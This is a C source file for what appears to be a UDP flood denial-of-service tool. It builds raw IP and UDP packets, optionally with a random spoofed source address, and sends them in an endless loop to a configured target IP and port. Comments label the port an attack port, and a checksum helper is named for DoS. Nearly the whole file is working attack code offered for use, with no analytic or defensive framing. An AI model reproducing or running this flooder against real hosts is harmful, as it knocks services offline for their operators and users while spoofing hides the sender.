#include <stdio.h>
#include <errno.h>
#include <string.h> //memset
#include <stdlib.h> //exit
#include "utils.h"
#include "udp.h"
#include "config.h"

Configuration config;

void udp_worker()
{
	printf("start udp\n");
	if(udp_send()) exit(1);
}

int
udp_send( )
{

	struct
	{
	  struct ip ipH;
	  struct udphdr udpH;
	  char data[1024];

	} udp;

	memset(&udp, 0, sizeof(udp));
	int rawsock;
	struct sockaddr_in sin;	

	int pkgsize = htons (sizeof (struct ip) + sizeof(struct udphdr) + config.udp_pkgsize);
	unsigned long saddr = ( strcmp(config.udp_sourceip, "*") == 0 ) ? random_lip() : inet_addr(config.udp_sourceip);
	unsigned long daddr = inet_addr(config.udp_targetip);
	int sport = config.udp_sourceport == 0 ? random_int(1, 65535) : config.udp_sourceport;

	// ip header
	udp.ipH.ip_v = 4; /* version */
	udp.ipH.ip_hl = 5; /* header length */
	udp.ipH.ip_tos = 0x00; /* type of service */
	udp.ipH.ip_len = pkgsize; /* total length */
	udp.ipH.ip_ttl = 255; /* time to live */
	udp.ipH.ip_off = 0; /* fragment offset field */
	udp.ipH.ip_id = htons(random_int(1, 65535));  /* identification */
	udp.ipH.ip_p = IPPROTO_UDP; /* protocol */
	udp.ipH.ip_sum = 0; /* checksum */
	udp.ipH.ip_src.s_addr = saddr; /* source address */
	udp.ipH.ip_dst.s_addr = daddr; /* dest address */
	udp.ipH.ip_sum = ip_sum((unsigned short*)&udp.ipH,sizeof(udp.ipH));//检验和

	// udp header
	udp.udpH.uh_sport = htons( sport ); //16位源端口
	udp.udpH.uh_dport = htons( config.udp_targetport ); //16位目的端口
	udp.udpH.uh_ulen = htons(sizeof(struct udphdr ) + config.udp_pkgsize); //16位UDP包长度
	//udp.udpH.uh_sum = 0; //16位校验和
	//udp.udpH.uh_sum = DoS_cksum((unsigned short*)&udp.udpH, pkgsize);//UDP校验和	

    sin.sin_family = AF_INET;
    //sin.sin_port = htons(53); //攻击端口
    sin.sin_addr.s_addr = daddr;	
	
    rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if( rawsock < 0 )
    {
        printf("[-]Error to open socket.\n");

        return 1;
    }	

    const int optVal = 1;
    
    if( setsockopt( rawsock , IPPROTO_IP , IP_HDRINCL , &optVal , sizeof( optVal ) ) < 0 )
    {
        printf("[-]Error to setsockopt to the socket.\n");

        return 1;
    }
	while(1) 
	{
	    if( sendto( rawsock , (void *)&udp , sizeof(udp)  , 0 , ( struct sockaddr *) &sin , sizeof(sin)) < 0 )
	    {

	        printf("[-]Error to sendto : %s[%d].\n" , strerror(errno), errno );

	        return 1;
	    }
		if (config.udp_sleeptime > 0) usleep(config.udp_sleeptime);
	}

    return 0;
     
}